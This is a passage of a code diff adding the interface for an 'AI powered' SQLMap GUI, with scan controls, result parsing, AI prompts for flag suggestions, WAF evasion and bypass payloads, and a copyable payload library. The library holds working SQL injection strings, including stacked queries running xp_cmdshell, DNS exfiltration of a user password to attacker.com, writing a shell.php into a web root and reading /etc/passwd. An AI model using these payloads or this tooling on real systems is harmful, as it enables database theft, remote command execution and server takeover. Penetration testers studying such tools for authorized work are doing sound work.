+            <label class="cb-item"><input type="checkbox" id="crawl" onchange="updateCbStyle(this)"> --crawl=2</label>
+            <label class="cb-item"><input type="checkbox" id="smart" onchange="updateCbStyle(this)"> --smart</label>
+            <label class="cb-item"><input type="checkbox" id="tamper_space2comment" onchange="updateCbStyle(this)"> space2comment</label>
+            <label class="cb-item"><input type="checkbox" id="tamper_between" onchange="updateCbStyle(this)"> between</label>
+            <label class="cb-item"><input type="checkbox" id="tamper_charencode" onchange="updateCbStyle(this)"> charencode</label>
+          </div>
+          <div class="field" style="margin-top:8px">
+            <label>EXTRA FLAGS</label>
+            <input type="text" id="extraFlags" placeholder="--fresh-queries --time-sec=5" />
+          </div>
+        </div>
+
+        <div class="config-section">
+          <div class="config-section-title">AI ASSIST</div>
+          <button class="btn btn-ai btn-full" onclick="aiSuggestFlags()">
+            🤖 AI: Suggest Flags for Target
+          </button>
+          <div style="height:8px"></div>
+          <button class="btn btn-ghost btn-full" onclick="aiAnalyzeOutput()">
+            📊 AI: Analyze Last Output
+          </button>
+        </div>
+
+        <div class="config-section">
+          <div class="btn-row">
+            <button class="btn btn-primary" id="btnRun" onclick="runScan()" style="flex:1">
+              ▶ RUN SCAN
+            </button>
+            <button class="btn btn-danger" id="btnKill" onclick="killScan()" disabled>
+              ■ KILL
+            </button>
+          </div>
+          <div style="height:8px"></div>
+          <button class="btn btn-ghost btn-full" onclick="clearTerminal()">🗑 Clear Output</button>
+        </div>
+
+      </div>
+
+      <!-- Output Column -->
+      <div id="output-col">
+        <div id="output-header">
+          <div id="output-header-title">TERMINAL OUTPUT</div>
+          <div id="output-header-spacer"></div>
+          <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="copyOutput()">📋 Copy</button>
+          <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="exportOutput()">💾 Export</button>
+        </div>
+        <div id="terminal">
+          <div class="term-banner">
+╔══════════════════════════════════════════════════════════╗
+║         SQLMap GUI — AI Powered Penetration Tool         ║
+║               Configure target and click RUN             ║
+╚══════════════════════════════════════════════════════════╝
+
+[i] SQLMap GUI provides a visual interface for the SQLMap tool.
+[i] Ensure SQLMap is installed and accessible in your PATH.
+[i] Set your Anthropic API key in the AI tab for AI features.
+
+<span style="color:var(--warn)">[!] FOR AUTHORIZED PENETRATION TESTING USE ONLY</span>
+<span style="color:var(--warn)">[!] Unauthorized testing is illegal and unethical.</span>
+</div>
+        </div>
+        <div id="cmd-preview">
+          <span>$</span> <span id="cmd-text">sqlmap (configure options above)</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── AI PANEL ───────────────────────────────────── -->
+    <div class="panel" id="panel-ai">
+      <div id="ai-left">
+        <div class="panel-header">
+          <div class="panel-header-title">🤖 AI ASSISTANT — SQLMAP EXPERT</div>
+          <div class="panel-header-spacer"></div>
+          <button class="btn btn-ghost" style="font-size:10px;padding:4px 10px" onclick="clearAiChat()">🗑 Clear</button>
+        </div>
+        <div id="ai-messages">
+          <div class="ai-msg assistant">
+            <div class="ai-role">AI ASSISTANT</div>
+            <div class="ai-bubble">
+              👋 Hello! I'm your AI-powered SQLMap assistant.<br><br>
+              I can help you:
+              <pre>• Suggest optimal SQLMap flags for your target
+• Explain scan results in plain English
+• Analyze vulnerabilities found
+• Generate bypass payloads
+• Answer SQLi questions</pre>
+              Configure your target in the Scan tab, then ask me to suggest flags — or just ask anything about SQL injection!
+            </div>
+          </div>
+        </div>
+        <div id="ai-input-row">
+          <textarea id="ai-input" placeholder="Ask about SQL injection, request flag suggestions, paste scan output for analysis..." onkeydown="aiInputKey(event)"></textarea>
+          <div style="display:flex;flex-direction:column;gap:6px">
+            <button class="btn btn-ai" style="height:100%;padding:0 16px" onclick="sendAiMessage()">SEND</button>
+          </div>
+        </div>
+      </div>
+      <div id="ai-right">
+        <div class="ai-panel-title">QUICK ACTIONS</div>
+        <button class="quick-btn" onclick="aiQuick('flags')"><span class="qicon">⚡</span> Suggest flags for current target</button>
+        <button class="quick-btn" onclick="aiQuick('analyze')"><span class="qicon">🔍</span> Analyze scan output</button>
+        <button class="quick-btn" onclick="aiQuick('explain')"><span class="qicon">📖</span> Explain last results</button>
+        <button class="quick-btn" onclick="aiQuick('payloads')"><span class="qicon">💉</span> Generate bypass payloads</button>
+        <button class="quick-btn" onclick="aiQuick('waf')"><span class="qicon">🛡️</span> WAF evasion techniques</button>
+        <button class="quick-btn" onclick="aiQuick('optimize')"><span class="qicon">🚀</span> Optimize scan speed</button>
+        <button class="quick-btn" onclick="aiQuick('report')"><span class="qicon">📄</span> Generate vuln report</button>
+        <div style="padding:12px 16px;border-bottom:1px solid var(--border)">
+          <div style="font-size:10px;letter-spacing:1px;color:var(--text-dim);font-weight:600;margin-bottom:8px">CONTEXT</div>
+          <div style="font-size:11px;color:var(--text-dim)">Target URL:</div>
+          <div id="ai-ctx-url" style="font-family:var(--mono);font-size:10px;color:var(--accent);word-break:break-all;margin-top:2px">—</div>
+          <div style="font-size:11px;color:var(--text-dim);margin-top:8px">Last scan:</div>
+          <div id="ai-ctx-scan" style="font-size:10px;color:var(--text-dim);margin-top:2px">No scan run yet</div>
+        </div>
+        <div id="api-key-section">
+          <label>ANTHROPIC API KEY</label>
+          <div class="api-key-row">
+            <input type="password" id="apiKeyInput" placeholder="sk-ant-..." />
+            <button class="btn btn-ghost" style="font-size:10px;padding:4px 8px;white-space:nowrap" onclick="saveApiKey()">Save</button>
+          </div>
+          <div style="font-size:10px;color:var(--text-dim);margin-top:6px">Stored in process env. Not persisted to disk.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── RESULTS PANEL ──────────────────────────────── -->
+    <div class="panel" id="panel-results">
+      <div class="panel-header" style="flex-shrink:0">
+        <div class="panel-header-title">🎯 VULNERABILITY RESULTS</div>
+        <div class="panel-header-spacer"></div>
+        <button class="btn btn-ai" style="font-size:10px;padding:6px 12px" onclick="aiGenerateReport()">🤖 AI Report</button>
+        <button class="btn btn-ghost" style="font-size:10px;padding:6px 12px" onclick="exportResults()">💾 Export JSON</button>
+      </div>
+      <div id="results-list" style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:12px">
+        <div class="results-empty">
+          <div class="big-icon">🎯</div>
+          <p>No results yet. Run a scan to see vulnerabilities here.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── PAYLOADS PANEL ─────────────────────────────── -->
+    <div class="panel" id="panel-payloads">
+      <div class="panel-header" style="flex-shrink:0">
+        <div class="panel-header-title">💉 PAYLOAD LIBRARY</div>
+        <div class="panel-header-spacer"></div>
+        <button class="btn btn-ai" style="font-size:10px;padding:6px 12px" onclick="aiGeneratePayloads()">🤖 AI: Generate Custom</button>
+      </div>
+      <div id="payload-content">
+        <div id="payload-categories"></div>
+        <div id="payload-list"></div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div id="notif-container"></div>
+
+<script>
+// ══════════════════════════════════════════════════════════
+//  APP STATE
+// ══════════════════════════════════════════════════════════
+const state = {
+  isRunning: false,
+  outputLog: '',
+  scanHistory: [],
+  vulns: [],
+  aiMessages: [],
+  currentTab: 'scan',
+};
+
+const api = window.sqlmapAPI;
+
+// ══════════════════════════════════════════════════════════
+//  INIT
+// ══════════════════════════════════════════════════════════
+async function init() {
+  // Load API key
+  const key = await api.getApiKey();
+  if (key) document.getElementById('apiKeyInput').value = key;
+
+  // Init cb styles
+  document.querySelectorAll('.cb-item input').forEach(cb => {
+    if (cb.checked) cb.closest('.cb-item').classList.add('checked');
+  });
+
+  // Listen for sqlmap output
+  api.onOutput(handleOutput);
+  api.onDone(handleDone);
+
+  // Init payloads
+  renderPayloads();
+
+  // Update cmd preview on any input change
+  document.querySelectorAll('input,select,textarea').forEach(el => {
+    el.addEventListener('input', updateCmdPreview);
+    el.addEventListener('change', updateCmdPreview);
+  });
+
+  updateCmdPreview();
+}
+
+// ══════════════════════════════════════════════════════════
+//  TABS
+// ══════════════════════════════════════════════════════════
+function switchTab(tab) {
+  state.currentTab = tab;
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById(`panel-${tab}`).classList.add('active');
+  document.getElementById(`tab-${tab}`).classList.add('active');
+  document.getElementById(`nav-${tab}`).classList.add('active');
+
+  if (tab === 'ai') {
+    document.getElementById('ai-ctx-url').textContent = document.getElementById('targetUrl').value || '—';
+    document.getElementById('ai-ctx-scan').textContent = state.outputLog ? `${state.outputLog.length} chars captured` : 'No scan run yet';
+  }
+}
+
+// ══════════════════════════════════════════════════════════
+//  BUILD SQLMAP ARGS
+// ══════════════════════════════════════════════════════════
+function buildArgs() {
+  const args = [];
+  const url = document.getElementById('targetUrl').value.trim();
+  const reqFile = document.getElementById('requestFile').value.trim();
+
+  if (reqFile) {
+    args.push('-r', reqFile);
+  } else if (url) {
+    args.push('-u', url);
+  }
+
+  const method = document.getElementById('method').value;
+  if (method !== 'GET') args.push('--method', method);
+
+  const post = document.getElementById('postData').value.trim();
+  if (post) args.push('--data', post);
+
+  const param = document.getElementById('param').value.trim();
+  if (param) args.push('-p', param);
+
+  // Techniques
+  const techs = [...document.querySelectorAll('#techniques input:checked')].map(c => c.value).join('');
+  if (techs && techs !== 'BEUTSQ') args.push('--technique', techs);
+
+  const dbms = document.getElementById('dbms').value;
+  if (dbms) args.push('--dbms', dbms);
+
+  const level = document.getElementById('level').value;
+  if (level !== '1') args.push('--level', level);
+
+  const risk = document.getElementById('risk').value;
+  if (risk !== '1') args.push('--risk', risk);
+
+  const threads = document.getElementById('threads').value;
+  if (threads !== '1') args.push('--threads', threads);
+
+  const cookie = document.getElementById('cookie').value.trim();
+  if (cookie) args.push('--cookie', cookie);
+
+  const ua = document.getElementById('useragent').value;
+  if (ua && ua !== 'custom') args.push('--user-agent', ua);
+
+  const proxy = document.getElementById('proxy').value.trim();
+  if (proxy) args.push('--proxy', proxy);
+
+  // Headers
+  document.getElementById('headers').value.trim().split('\n').filter(Boolean).forEach(h => {
+    args.push('-H', h);
+  });
+
+  const delay = document.getElementById('delay').value;
+  if (delay && delay !== '0') args.push('--delay', delay);
+
+  // Enumeration
+  if (document.getElementById('getDbs').checked) args.push('--dbs');
+  if (document.getElementById('getCurrentDb').checked) args.push('--current-db');
+  if (document.getElementById('getCurrentUser').checked) args.push('--current-user');
+  if (document.getElementById('getHostname').checked) args.push('--hostname');
+  if (document.getElementById('getTables').checked) args.push('--tables');
+  if (document.getElementById('getColumns').checked) args.push('--columns');
+  if (document.getElementById('dumpAll').checked) args.push('--dump');
+  if (document.getElementById('isDba').checked) args.push('--is-dba');
+  if (document.getElementById('getPrivileges').checked) args.push('--privileges');
+  if (document.getElementById('getPasswords').checked) args.push('--passwords');
+
+  const tdb = document.getElementById('targetDb').value.trim();
+  if (tdb) args.push('-D', tdb);
+  const tbl = document.getElementById('targetTable').value.trim();
+  if (tbl) args.push('-T', tbl);
+
+  // Advanced
+  if (document.getElementById('random_agent').checked) args.push('--random-agent');
+  if (document.getElementById('tor').checked) args.push('--tor');
+  if (document.getElementById('batch').checked) args.push('--batch');
+  if (document.getElementById('flush_session').checked) args.push('--flush-session');
+  if (document.getElementById('forms').checked) args.push('--forms');
+  if (document.getElementById('crawl').checked) args.push('--crawl=2');
+  if (document.getElementById('smart').checked) args.push('--smart');
+
+  // Tamper
+  const tampers = [];
+  if (document.getElementById('tamper_space2comment').checked) tampers.push('space2comment');
+  if (document.getElementById('tamper_between').checked) tampers.push('between');
+  if (document.getElementById('tamper_charencode').checked) tampers.push('charencode');
+  if (tampers.length) args.push('--tamper', tampers.join(','));
+
+  // Extra
+  const extra = document.getElementById('extraFlags').value.trim();
+  if (extra) args.push(...extra.split(/\s+/).filter(Boolean));
+
+  return args;
+}
+
+function updateCmdPreview() {
+  const args = buildArgs();
+  document.getElementById('cmd-text').textContent = args.length
+    ? `sqlmap ${args.join(' ')}`
+    : 'sqlmap (configure options above)';
+}
+
+// ══════════════════════════════════════════════════════════
+//  SCAN EXECUTION
+// ══════════════════════════════════════════════════════════
+async function runScan() {
+  const url = document.getElementById('targetUrl').value.trim();
+  const reqFile = document.getElementById('requestFile').value.trim();
+
+  if (!url && !reqFile) {
+    notify('Enter a target URL or request file.', 'error');
+    return;
+  }
+
+  state.outputLog = '';
+  state.isRunning = true;
+  setRunning(true);
+
+  const terminal = document.getElementById('terminal');
+  terminal.innerHTML = '';
+  const args = buildArgs();
+  appendTerm(`[CMD] sqlmap ${args.join(' ')}\n\n`, 'cmd');
+
+  try {
+    await api.run(args);
+  } catch (e) {
+    appendTerm(`\n[ERROR] ${e.message}`, 'error');
+  }
+}
+
+function killScan() {
+  api.kill();
+  state.isRunning = false;
+  setRunning(false);
+}
+
+function setRunning(running) {
+  state.isRunning = running;
+  document.getElementById('btnRun').disabled = running;
+  document.getElementById('btnKill').disabled = !running;
+  const dot = document.getElementById('status-dot');
+  const txt = document.getElementById('status-text');
+  if (running) {
+    dot.className = 'running';
+    txt.textContent = 'SCANNING...';
+  } else {
+    dot.className = '';
+    txt.textContent = 'IDLE';
+  }
+}
+
+function handleOutput({ type, data }) {
+  state.outputLog += data;
+  const cls = type === 'stderr' ? 'stderr' : type === 'error' ? 'error' : type === 'system' ? 'system' : 'stdout';
+
+  // colorize special lines
+  let colorClass = `term-${cls}`;
+  if (/\[CRITICAL\]|\[ERROR\]/.test(data)) colorClass = 'term-error';
+  else if (/\[WARNING\]/.test(data)) colorClass = 'term-system';
+  else if (/is vulnerable|injection/.test(data.toLowerCase())) colorClass = 'term-vuln';
+  else if (/\[INFO\]/.test(data)) colorClass = 'term-info';
+  else if (/parameter.*appears to be/.test(data.toLowerCase())) colorClass = 'term-success';
+
+  appendTerm(data, colorClass.replace('term-', ''));
+
+  // parse vulnerabilities
+  parseVulns(data);
+}
+
+function handleDone({ code, logPath }) {
+  state.isRunning = false;
+  setRunning(false);
+
+  const msg = code === 0
+    ? '\n[DONE] Scan completed successfully.\n'
+    : `\n[DONE] Process exited with code ${code}.\n`;
+  appendTerm(msg, code === 0 ? 'success' : 'system');
+
+  // Add to history
+  const url = document.getElementById('targetUrl').value.trim();
+  const hasVulns = state.vulns.length > 0;
+  addHistory(url, hasVulns ? 'vuln' : 'clean');
+  notify(code === 0 ? 'Scan complete!' : `Scan ended (exit ${code})`, code === 0 ? 'success' : 'warn');
+}
+
+function appendTerm(text, cls = 'stdout') {
+  const terminal = document.getElementById('terminal');
+  const div = document.createElement('div');
+  div.className = `term-line term-${cls}`;
+  div.textContent = text;
+  terminal.appendChild(div);
+  terminal.scrollTop = terminal.scrollHeight;
+}
+
+// ══════════════════════════════════════════════════════════
+//  VULN PARSING
+// ══════════════════════════════════════════════════════════
+function parseVulns(data) {
+  // Detect injectable parameters
+  const match = data.match(/parameter '([^']+)'.*?(boolean-based|error-based|time-based|union|stacked)/i);
+  if (match) {
+    const vuln = {
+      id: Date.now(),
+      param: match[1],
+      type: match[2],
+      severity: getSeverity(match[2]),
+      url: document.getElementById('targetUrl').value.trim(),
+      payload: '',
+      timestamp: new Date().toISOString(),
+    };
+
+    // extract payload
+    const plMatch = data.match(/payload: (.+)/i);
+    if (plMatch) vuln.payload = plMatch[1].trim();
+
+    state.vulns.push(vuln);
+    renderResults();
+    updateVulnBadge();
+  }
+}
+
+function getSeverity(type) {
+  if (/union|stacked/i.test(type)) return 'critical';
+  if (/error-based/i.test(type)) return 'high';
+  if (/boolean|time/i.test(type)) return 'medium';
+  return 'low';
+}
+
+function updateVulnBadge() {
+  const badge = document.getElementById('vuln-badge');
+  if (state.vulns.length > 0) {
+    badge.style.display = 'inline';
+    badge.textContent = state.vulns.length;
+  }
+}
+
+function renderResults() {
+  const list = document.getElementById('results-list');
+  if (state.vulns.length === 0) {
+    list.innerHTML = '<div class="results-empty"><div class="big-icon">🎯</div><p>No results yet. Run a scan to see vulnerabilities here.</p></div>';
+    return;
+  }
+
+  list.innerHTML = state.vulns.map(v => `
+    <div class="vuln-card">
+      <div class="vuln-card-header" onclick="toggleVuln(${v.id})">
+        <span class="vuln-severity sev-${v.severity}">${v.severity.toUpperCase()}</span>
+        <span class="vuln-type">SQL Injection (${v.type})</span>
+        <span class="vuln-param">param: ${v.param}</span>
+        <div class="vuln-card-spacer"></div>
+        <span class="vuln-toggle" id="toggle-${v.id}">▼</span>
+      </div>
+      <div class="vuln-card-body" id="body-${v.id}">
+        <dl class="vuln-detail">
+          <dt>URL</dt><dd>${v.url || 'N/A'}</dd>
+          <dt>Parameter</dt><dd>${v.param}</dd>
+          <dt>Type</dt><dd>${v.type}</dd>
+          <dt>Severity</dt><dd>${v.severity}</dd>
+          <dt>Payload</dt><dd>${v.payload || 'See terminal output'}</dd>
+          <dt>Detected</dt><dd>${new Date(v.timestamp).toLocaleString()}</dd>
+        </dl>
+        <div style="margin-top:12px;display:flex;gap:8px">
+          <button class="btn btn-ai" style="font-size:10px;padding:6px 12px" onclick="aiExplainVuln(${v.id})">🤖 AI Explain</button>
+          <button class="btn btn-ghost" style="font-size:10px;padding:6px 12px" onclick="copyVuln(${v.id})">📋 Copy Details</button>
+        </div>
+      </div>
+    </div>
+  `).join('');
+}
+
+function toggleVuln(id) {
+  const body = document.getElementById(`body-${id}`);
+  const toggle = document.getElementById(`toggle-${id}`);
+  const isOpen = body.classList.toggle('open');
+  toggle.classList.toggle('open', isOpen);
+}
+
+// ══════════════════════════════════════════════════════════
+//  HISTORY
+// ══════════════════════════════════════════════════════════
+function addHistory(url, status) {
+  if (!url) return;
+  state.scanHistory.unshift({ url, status, time: new Date().toLocaleTimeString() });
+  renderHistory();
+}
+
+function renderHistory() {
+  const list = document.getElementById('history-list');
+  if (!state.scanHistory.length) {
+    list.innerHTML = '<div style="padding:16px;font-size:11px;color:var(--text-dim);text-align:center">No scans yet</div>';
+    return;
+  }
+  list.innerHTML = state.scanHistory.slice(0, 20).map(h => `
+    <div class="history-item" onclick="loadHistoryTarget('${h.url}')">
+      <div class="h-url"><span class="h-status ${h.status}"></span>${h.url}</div>
+      <div class="h-time">${h.time}</div>
+    </div>
+  `).join('');
+}
+
+function loadHistoryTarget(url) {
+  document.getElementById('targetUrl').value = url;
+  switchTab('scan');
+  updateCmdPreview();
+}
+
+// ══════════════════════════════════════════════════════════
+//  AI INTEGRATION
+// ══════════════════════════════════════════════════════════
+const AI_SYSTEM = `You are an expert penetration tester specializing in SQL injection and the SQLMap tool. 
+You help security professionals understand vulnerabilities, generate SQLMap commands, analyze scan results, 
+and create bypass payloads. You provide concise, actionable advice. Always remind users that testing 
+should only be done on authorized systems. Format SQLMap commands in code blocks.`;
+
+async function sendAiMessage() {
+  const input = document.getElementById('ai-input');
+  const text = input.value.trim();
+  if (!text) return;
+
+  input.value = '';
+  addAiMessage('user', text);
+  const thinking = showThinking();
+
+  const messages = state.aiMessages.map(m => ({ role: m.role, content: m.content }));
+  messages.push({ role: 'user', content: text });
+
+  const result = await api.aiRequest({ messages, system: AI_SYSTEM });
+  removeThinking(thinking);
+
+  if (result.success) {
+    addAiMessage('assistant', result.text);
+    state.aiMessages.push({ role: 'user', content: text });
+    state.aiMessages.push({ role: 'assistant', content: result.text });
+  } else {
+    addAiMessage('assistant', `❌ AI Error: ${result.text}\n\nMake sure your Anthropic API key is set in the AI tab.`);
+  }
+}
+
+async function aiQuick(type) {
+  switchTab('ai');
+  const url = document.getElementById('targetUrl').value.trim();
+  const prompts = {
+    flags: `Based on target URL: "${url || 'not set'}", suggest the optimal SQLMap flags and explain why each one is useful. Include the full command.`,
+    analyze: `Analyze this SQLMap output and identify vulnerabilities, their severity, and recommended next steps:\n\n${state.outputLog.slice(-3000) || 'No output yet. Please run a scan first.'}`,
+    explain: `Explain the vulnerabilities found in plain English that a non-technical stakeholder could understand:\n\n${state.outputLog.slice(-2000) || 'No scan results yet.'}`,
+    payloads: `Generate a set of SQL injection bypass payloads for WAF evasion targeting URL: ${url || 'a web application'}. Include UNION-based, boolean-based, and time-based payloads.`,
+    waf: `What are the best SQLMap tamper scripts and techniques for bypassing WAF protection? Give specific commands for common WAFs (Cloudflare, ModSecurity, AWS WAF).`,
+    optimize: `How can I optimize my SQLMap scan for speed without losing accuracy? Current target: ${url || 'not set'}. Give specific flag recommendations.`,
+    report: `Generate a professional penetration testing report summary based on these findings:\n\n${state.outputLog.slice(-3000) || 'No scan output available yet.'}`,
+  };
+
+  const prompt = prompts[type];
+  document.getElementById('ai-input').value = prompt;
+  await sendAiMessage();
+}
+
+async function aiSuggestFlags() {
+  switchTab('ai');
+  await aiQuick('flags');
+}
+
+async function aiAnalyzeOutput() {
+  if (!state.outputLog) {
+    notify('No scan output to analyze. Run a scan first.', 'warn');
+    return;
+  }
+  switchTab('ai');
+  await aiQuick('analyze');
+}
+
+async function aiExplainVuln(id) {
+  const vuln = state.vulns.find(v => v.id === id);
+  if (!vuln) return;
+  switchTab('ai');
+  const prompt = `Explain this SQL injection vulnerability in detail, including its risk, exploitation potential, and remediation recommendations:\n\nParameter: ${vuln.param}\nType: ${vuln.type}\nSeverity: ${vuln.severity}\nPayload: ${vuln.payload}\nURL: ${vuln.url}`;
+  document.getElementById('ai-input').value = prompt;
+  await sendAiMessage();
+}
+
+async function aiGenerateReport() {
+  switchTab('ai');
+  await aiQuick('report');
+}
+
+async function aiGeneratePayloads() {
+  switchTab('ai');
+  await aiQuick('payloads');
+}
+
+function addAiMessage(role, content) {
+  const container = document.getElementById('ai-messages');
+  const div = document.createElement('div');
+  div.className = `ai-msg ${role}`;
+
+  // Format code blocks
+  const formatted = content
+    .replace(/```(\w*)\n?([\s\S]*?)```/g, (_, lang, code) => `<pre>${escHtml(code.trim())}</pre>`)
+    .replace(/`([^`]+)`/g, (_, c) => `<code>${escHtml(c)}</code>`)
+    .replace(/\n/g, '<br>');
+
+  div.innerHTML = `
+    <div class="ai-role">${role === 'user' ? 'YOU' : 'AI ASSISTANT'}</div>
+    <div class="ai-bubble">${formatted}</div>
+  `;
+  container.appendChild(div);
+  container.scrollTop = container.scrollHeight;
+  return div;
+}
+
+function showThinking() {
+  const container = document.getElementById('ai-messages');
+  const div = document.createElement('div');
+  div.className = 'ai-msg assistant';
+  div.innerHTML = `<div class="ai-role">AI ASSISTANT</div><div class="ai-bubble"><div class="ai-thinking"><span></span><span></span><span></span></div></div>`;
+  container.appendChild(div);
+  container.scrollTop = container.scrollHeight;
+  return div;
+}
+
+function removeThinking(el) { el.remove(); }
+
+function clearAiChat() {
+  state.aiMessages = [];
+  document.getElementById('ai-messages').innerHTML = `
+    <div class="ai-msg assistant">
+      <div class="ai-role">AI ASSISTANT</div>
+      <div class="ai-bubble">Chat cleared. How can I help you?</div>
+    </div>`;
+}
+
+function aiInputKey(e) {
+  if (e.key === 'Enter' && !e.shiftKey) {
+    e.preventDefault();
+    sendAiMessage();
+  }
+}
+
+async function saveApiKey() {
+  const key = document.getElementById('apiKeyInput').value.trim();
+  await api.setApiKey(key);
+  notify('API key saved for this session.', 'success');
+}
+
+// ══════════════════════════════════════════════════════════
+//  PAYLOAD LIBRARY
+// ══════════════════════════════════════════════════════════
+const PAYLOADS = {
+  'Boolean-Based': [
+    { name: "Classic AND True", code: "' AND 1=1--", desc: "Basic boolean true condition" },
+    { name: "Classic AND False", code: "' AND 1=2--", desc: "Basic boolean false condition to confirm injection" },
+    { name: "OR 1=1", code: "' OR 1=1--", desc: "Always-true condition, use carefully" },
+    { name: "AND Substring", code: "' AND SUBSTRING(username,1,1)='a'--", desc: "Extract data character by character" },
+    { name: "AND ASCII", code: "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--", desc: "Binary search data extraction" },
+  ],
+  'Error-Based': [
+    { name: "ExtractValue (MySQL)", code: "' AND ExtractValue(1,CONCAT(0x7e,(SELECT version())))--", desc: "MySQL error-based extraction" },
+    { name: "UpdateXML (MySQL)", code: "' AND UpdateXML(1,CONCAT(0x7e,(SELECT database())),1)--", desc: "MySQL UpdateXML error" },
+    { name: "Convert Error (MSSQL)", code: "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--", desc: "MSSQL conversion error" },
+    { name: "XPATH Error (MySQL)", code: "' OR 1=1 AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", desc: "MySQL XPATH duplicate error" },
+  ],
+  'Union-Based': [
+    { name: "UNION SELECT NULL", code: "' UNION SELECT NULL--", desc: "Determine number of columns" },
+    { name: "UNION 2 Columns", code: "' UNION SELECT NULL,NULL--", desc: "2-column union test" },
+    { name: "UNION Version", code: "' UNION SELECT 1,version()--", desc: "Extract database version" },
+    { name: "UNION User", code: "' UNION SELECT 1,user()--", desc: "Extract current DB user" },
+    { name: "UNION Tables", code: "' UNION SELECT table_name,NULL FROM information_schema.tables--", desc: "List all tables" },
+    { name: "UNION Columns", code: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", desc: "List columns" },
+  ],
+  'Time-Based': [
+    { name: "MySQL SLEEP", code: "' AND SLEEP(5)--", desc: "MySQL time delay" },
+    { name: "MSSQL WAITFOR", code: "'; WAITFOR DELAY '0:0:5'--", desc: "MSSQL time delay" },
+    { name: "PostgreSQL", code: "'; SELECT pg_sleep(5)--", desc: "PostgreSQL time delay" },
+    { name: "Conditional SLEEP", code: "' AND IF(1=1,SLEEP(5),0)--", desc: "Conditional time delay" },
+    { name: "Blind Data Extract", code: "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--", desc: "Time-based data extraction" },
+  ],
+  'WAF Bypass': [
+    { name: "Case Variation", code: "' UnIoN SeLeCt 1,2--", desc: "Mixed case to bypass case-sensitive filters" },
+    { name: "Comment Injection", code: "' UN/**/ION SEL/**/ECT 1,2--", desc: "SQL comments to break keywords" },
+    { name: "URL Encoding", code: "%27%20UNION%20SELECT%201%2C2--", desc: "URL-encoded payload" },
+    { name: "Double Encoding", code: "%2527%2520UNION%2520SELECT%25201%252C2--", desc: "Double URL encoded" },
+    { name: "Space Alternative", code: "'/**/UNION/**/SELECT/**/1,2--", desc: "Comments instead of spaces" },
+    { name: "Newline Bypass", code: "'%0aUNION%0aSELECT%0a1,2--", desc: "Newlines instead of spaces" },
+  ],
+  'Stacked Queries': [
+    { name: "MySQL Multi-Query", code: "'; INSERT INTO users VALUES('hacked','hacked')--", desc: "MySQL stacked query" },
+    { name: "MSSQL xp_cmdshell", code: "'; EXEC xp_cmdshell('whoami')--", desc: "MSSQL command execution" },
+    { name: "MSSQL sp_configure", code: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--", desc: "Enable advanced MSSQL options" },
+    { name: "DNS Exfil", code: "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\x'))--", desc: "DNS-based data exfiltration" },
+  ],
+  'OOB': [
+    { name: "MySQL OUTFILE", code: "' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php'--", desc: "Write file to web root" },
+    { name: "MySQL LOAD_FILE", code: "' UNION SELECT LOAD_FILE('/etc/passwd')--", desc: "Read local file" },
+    { name: "MSSQL DNS Lookup", code: "'; EXEC master..xp_dirtree '//YOUR_BURP_COLLAB.burpcollaborator.net/x'--", desc: "DNS out-of-band exfil via MSSQL" },
+  ],
+};
+
+let currentPayloadCat = Object.keys(PAYLOADS)[0];
+
+function renderPayloads() {
+  const catEl = document.getElementById('payload-categories');
+  catEl.innerHTML = Object.keys(PAYLOADS).map(cat => `
+    <div class="payload-cat ${cat === currentPayloadCat ? 'active' : ''}" onclick="selectPayloadCat('${cat}')">${cat}</div>
+  `).join('');
+  renderPayloadList();
+}
+
+function selectPayloadCat(cat) {
+  currentPayloadCat = cat;
+  renderPayloads();
+}
+
+function renderPayloadList() {
+  const listEl = document.getElementById('payload-list');
+  listEl.innerHTML = PAYLOADS[currentPayloadCat].map((p, i) => `
+    <div class="payload-item" id="pi-${i}">
+      <div class="payload-name">${p.name}</div>
+      <div class="payload-code">${escHtml(p.code)}</div>
+      <div class="payload-desc">${p.desc}</div>
+      <button class="payload-copy" onclick="copyPayload(${i}, event)">COPY</button>
+    </div>
+  `).join('');
+}
+
+function copyPayload(i, e) {
+  e.stopPropagation();
+  const p = PAYLOADS[currentPayloadCat][i];
+  navigator.clipboard.writeText(p.code);
+  const btn = e.target;
+  btn.textContent = 'COPIED!';
+  setTimeout(() => btn.textContent = 'COPY', 1500);
+  notify(`Payload copied: ${p.name}`, 'success');
+}
+
+// ══════════════════════════════════════════════════════════
+//  UTILITIES
+// ══════════════════════════════════════════════════════════
+function escHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function updateCbStyle(cb) {
+  cb.closest('.cb-item').classList.toggle('checked', cb.checked);
+  updateCmdPreview();
+}
+
+function clearTerminal() {
+  document.getElementById('terminal').innerHTML = '';
+  state.outputLog = '';
+}
+
+function copyOutput() {
+  navigator.clipboard.writeText(state.outputLog);
+  notify('Output copied to clipboard', 'success');
+}
+
+function exportOutput() {
+  const blob = new Blob([state.outputLog], { type: 'text/plain' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `sqlmap_output_${Date.now()}.txt`;
+  a.click();
+  notify('Output exported', 'success');
+}
+
+function exportResults() {
+  const blob = new Blob([JSON.stringify(state.vulns, null, 2)], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `sqlmap_results_${Date.now()}.json`;
